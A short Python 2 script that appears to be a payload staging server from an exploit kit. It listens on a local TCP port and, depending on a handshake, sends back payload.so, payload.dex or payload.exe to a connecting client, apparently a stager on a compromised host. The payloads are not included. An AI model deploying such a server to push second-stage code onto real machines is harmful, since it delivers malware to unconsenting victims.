import SocketServer
import struct

def p32(x):
	return struct.pack("<I", x)

class MyTcpHandler(SocketServer.BaseRequestHandler):

	def handle(self):
		print "[*] Connection from {}".format(self.client_address[0])
		sock = self.request

		handshake = sock.recv(4)
		if handshake not in ["HELO", "DEX\x00", "EXE\x00"]:
			return

		sock.send(handshake)
		if handshake == "HELO":
			self.serve(sock, "payload.so")
		elif handshake == "DEX\x00":
			self.serve(sock, "payload.dex")
		else:
			self.serve(sock, "payload.exe")

		print "[*] Done."

	def serve(self, sock, path):
		print("[*] Serving {}".format(path))
		payload = open(path).read()
		sock.send(p32(len(payload)))
		sock.send(payload)


if __name__ == '__main__':
	server = SocketServer.TCPServer(('localhost', 6666), MyTcpHandler)
	server.serve_forever()